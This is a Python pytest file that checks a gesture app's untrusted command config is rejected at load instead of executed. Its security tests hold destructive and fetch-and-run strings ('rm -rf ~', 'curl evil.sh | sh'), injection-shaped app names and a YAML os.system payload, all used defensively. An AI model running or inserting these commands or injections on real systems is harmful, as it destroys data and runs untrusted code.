"""Tests for the declarative command config.

A command config can arrive by download from a website, so it is untrusted
input. The security-shaped tests below are the point of this file: they assert
that a malicious or malformed config is rejected at load rather than executed.
"""

from __future__ import annotations

import json

import pytest
import yaml

from gestureflow.commands import (
    ACTION_TYPES,
    SCHEMA_VERSION,
    CommandConfigError,
    CommandReloader,
    CommandSet,
    load_commands,
    parse_action,
    parse_commands,
)
from gestureflow.utils import PROJECT_ROOT


def cfg_doc(**overrides):
    doc = {
        "version": SCHEMA_VERSION,
        "neutral_label": 0,
        "gestures": [
            {"label": 1, "name": "Spotlight",
             "action": {"type": "hotkey", "keys": ["command", "space"]}},
        ],
    }
    doc.update(overrides)
    return doc


# ---------------------------------------------------------------------------
# The shipped default
# ---------------------------------------------------------------------------

class TestShippedDefault:
    def test_default_config_loads(self):
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert len(commands.bindings) == 3

    def test_default_reproduces_the_original_bindings(self):
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert commands.get(1).action.keys == ("command", "space")
        assert commands.get(2).action.keys == ("ctrl", "up")
        assert commands.get(3).action.keys == ("command", "tab")

    def test_default_binds_only_labels_the_model_can_predict(self):
        # Labels 4 and 5 used to be bound to gestures the model could never
        # produce. They are comments in the default file now.
        commands = load_commands(PROJECT_ROOT / "configs" / "commands.default.yaml")
        assert set(commands.labels()) <= {1, 2, 3}


# ---------------------------------------------------------------------------
# Schema validation
# ---------------------------------------------------------------------------

class TestSchemaValidation:
    def test_valid_config_parses(self):
        commands = parse_commands(cfg_doc())
        assert commands.get(1).name == "Spotlight"

    def test_top_level_must_be_a_mapping(self):
        with pytest.raises(CommandConfigError, match="mapping"):
            parse_commands([1, 2, 3])

    def test_unsupported_version_is_rejected(self):
        with pytest.raises(CommandConfigError, match="version"):
            parse_commands(cfg_doc(version=99))

    def test_gestures_must_be_present_and_non_empty(self):
        with pytest.raises(CommandConfigError, match="gestures"):
            parse_commands(cfg_doc(gestures=[]))

    def test_missing_label_is_rejected(self):
        with pytest.raises(CommandConfigError, match="label"):
            parse_commands(cfg_doc(gestures=[
                {"name": "X", "action": {"type": "keypress", "key": "a"}}]))

    def test_missing_name_is_rejected(self):
        with pytest.raises(CommandConfigError, match="name"):
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "action": {"type": "keypress", "key": "a"}}]))

    def test_duplicate_label_is_rejected(self):
        with pytest.raises(CommandConfigError, match="already bound"):
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "name": "A",
                 "action": {"type": "keypress", "key": "a"}},
                {"label": 1, "name": "B",
                 "action": {"type": "keypress", "key": "b"}},
            ]))

    def test_binding_the_neutral_label_is_rejected(self):
        # Neutral is the "no gesture" state; binding it would fire an action
        # continuously whenever the hand was doing nothing.
        with pytest.raises(CommandConfigError, match="neutral"):
            parse_commands(cfg_doc(gestures=[
                {"label": 0, "name": "Oops",
                 "action": {"type": "keypress", "key": "a"}}]))

    def test_boolean_is_not_accepted_as_a_label(self):
        # bool is a subclass of int in Python; True must not become label 1.
        with pytest.raises(CommandConfigError, match="label"):
            parse_commands(cfg_doc(gestures=[
                {"label": True, "name": "X",
                 "action": {"type": "keypress", "key": "a"}}]))

    def test_error_message_names_the_offending_gesture(self):
        with pytest.raises(CommandConfigError) as exc:
            parse_commands(cfg_doc(gestures=[
                {"label": 1, "name": "Spotlight",
                 "action": {"type": "hotkey", "keys": ["comand", "space"]}}]))
        assert "Spotlight" in str(exc.value)
        assert "comand" in str(exc.value)


# ---------------------------------------------------------------------------
# Action types
# ---------------------------------------------------------------------------

class TestActionValidation:
    def test_all_declared_types_are_parseable(self):
        samples = {
            "hotkey": {"type": "hotkey", "keys": ["command", "space"]},
            "keypress": {"type": "keypress", "key": "enter"},
            "media": {"type": "media", "action": "playpause"},
            "launch": {"type": "launch", "app": "Notes"},
            "applescript": {"type": "applescript", "script": "beep"},
            "shell": {"type": "shell", "argv": ["echo", "hi"]},
        }
        assert set(samples) == ACTION_TYPES
        for kind, raw in samples.items():
            assert parse_action(raw, "test").type == kind

    def test_unknown_action_type_is_rejected(self):
        with pytest.raises(CommandConfigError, match="unknown action type"):
            parse_action({"type": "eval"}, "test")

    def test_unknown_key_name_is_rejected(self):
        with pytest.raises(CommandConfigError, match="not a recognized key"):
            parse_action({"type": "hotkey", "keys": ["comand", "space"]}, "t")

    def test_keys_are_normalized_to_lowercase(self):
        action = parse_action({"type": "hotkey", "keys": ["Command", "SPACE"]},
                              "t")
        assert action.keys == ("command", "space")

    def test_empty_hotkey_is_rejected(self):
        with pytest.raises(CommandConfigError, match="non-empty"):
            parse_action({"type": "hotkey", "keys": []}, "t")

    def test_absurd_hotkey_length_is_rejected(self):
        with pytest.raises(CommandConfigError, match="at most 5"):
            parse_action({"type": "hotkey",
                          "keys": ["a", "b", "c", "d", "e", "f"]}, "t")

    def test_unknown_media_action_is_rejected(self):
        with pytest.raises(CommandConfigError, match="unknown media action"):
            parse_action({"type": "media", "action": "teleport"}, "t")


class TestNoArbitraryExecution:
    """A downloaded config must not be able to run arbitrary commands."""

    def test_shell_requires_an_argv_list_not_a_string(self):
        # A command *string* would be shell-interpreted somewhere downstream.
        with pytest.raises(CommandConfigError, match="argv"):
            parse_action({"type": "shell", "cmd": "rm -rf ~"}, "t")

    def test_shell_argv_entries_must_be_strings(self):
        with pytest.raises(CommandConfigError, match="string"):
            parse_action({"type": "shell", "argv": ["echo", {"x": 1}]}, "t")

    def test_shell_argv_survives_metacharacters_as_literal_text(self):
        # These stay a single literal argument. Because the action is executed
        # without a shell, they are text passed to echo, not a command chain.
        action = parse_action(
            {"type": "shell", "argv": ["echo", "; rm -rf ~ && curl evil.sh"]},
            "t")
        assert action.argv == ("echo", "; rm -rf ~ && curl evil.sh")
        assert len(action.argv) == 2

    @pytest.mark.parametrize("app", [
        'Notes"; rm -rf ~; echo "',
        "Notes && curl evil.sh | sh",
        "Notes\nrm -rf ~",
        "../../../bin/sh",
        "$(whoami)",
        "`id`",
    ])
    def test_injection_shaped_app_names_are_rejected(self, app):
        with pytest.raises(CommandConfigError, match="not a valid application"):
            parse_action({"type": "launch", "app": app}, "t")

    def test_ordinary_app_names_are_accepted(self):
        for app in ["Notes", "Visual Studio Code", "IINA", "1Password 7",
                    "Adobe Photoshop 2024"]:
            assert parse_action({"type": "launch", "app": app}, "t").app == app

    def test_yaml_cannot_construct_python_objects(self):
        # safe_load, not load: !!python/object tags must not be honoured.
        evil = "!!python/object/apply:os.system ['echo pwned']"
        with pytest.raises(yaml.YAMLError):
            yaml.safe_load(evil)

    def test_oversized_applescript_is_rejected(self):
        with pytest.raises(CommandConfigError, match="4000"):
            parse_action({"type": "applescript", "script": "x" * 5000}, "t")


# ---------------------------------------------------------------------------
# Round-tripping (the web builder exports what the app reads)
# ---------------------------------------------------------------------------

class TestRoundTrip:
    def test_to_dict_reparses_identically(self):
        original = parse_commands(cfg_doc(gestures=[
            {"label": 1, "name": "Spotlight",
             "action": {"type": "hotkey", "keys": ["command", "space"]}},
            {"label": 2, "name": "Notes", "description": "open it",
             "action": {"type": "launch", "app": "Notes"}},
            {"label": 3, "name": "Play",
             "action": {"type": "media", "action": "playpause"}},
        ]))
        reparsed = parse_commands(original.to_dict())
        assert reparsed.to_dict() == original.to_dict()

    def test_yaml_round_trip(self):
        original = parse_commands(cfg_doc())
        reparsed = parse_commands(yaml.safe_load(original.to_yaml()))
        assert reparsed.to_dict() == original.to_dict()

    def test_json_round_trip(self):
        original = parse_commands(cfg_doc())
        reparsed = parse_commands(json.loads(json.dumps(original.to_dict())))
        assert reparsed.to_dict() == original.to_dict()


# ---------------------------------------------------------------------------
# Loading and hot-reload
# ---------------------------------------------------------------------------

class TestLoading:
    def test_missing_file_is_reported_clearly(self, tmp_path):
        with pytest.raises(CommandConfigError, match="No command config"):
            load_commands(tmp_path / "nope.yaml")

    def test_json_config_is_accepted(self, tmp_path):
        path = tmp_path / "commands.json"
        path.write_text(json.dumps(cfg_doc()))
        assert load_commands(path).get(1).name == "Spotlight"

    def test_malformed_yaml_names_the_file(self, tmp_path):
        path = tmp_path / "commands.yaml"
        path.write_text("gestures: [unclosed")
        with pytest.raises(CommandConfigError, match="invalid YAML"):
            load_commands(path)


class TestHotReload:
    def _write(self, path, doc):
        path.write_text(yaml.safe_dump(doc))

    def test_reloads_when_the_file_changes(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)
        assert reloader.commands.get(1).name == "Spotlight"

        self._write(path, cfg_doc(gestures=[
            {"label": 1, "name": "Renamed",
             "action": {"type": "keypress", "key": "a"}}]))
        import os
        os.utime(path, (0, 0))          # force a distinct mtime

        assert reloader.poll(now=100.0)
        assert reloader.commands.get(1).name == "Renamed"

    def test_broken_edit_keeps_the_previous_config(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)

        path.write_text("gestures: [")
        import os
        os.utime(path, (0, 0))

        assert not reloader.poll(now=100.0)
        assert reloader.commands.get(1).name == "Spotlight", (
            "a broken edit must not take the running config down with it"
        )

    def test_unchanged_file_does_not_reload(self, tmp_path):
        path = tmp_path / "commands.yaml"
        self._write(path, cfg_doc())
        reloader = CommandReloader(path, interval=0.0)
        assert not reloader.poll(now=100.0)


class TestCommandSetAccessors:
    def test_name_for_falls_back_gracefully(self):
        assert "9" in CommandSet().name_for(9)

    def test_has_and_get(self):
        commands = parse_commands(cfg_doc())
        assert commands.has(1)
        assert not commands.has(7)
        assert commands.get(7) is None

    def test_describe_is_human_readable(self):
        commands = parse_commands(cfg_doc())
        assert commands.get(1).action.describe() == "command + space"
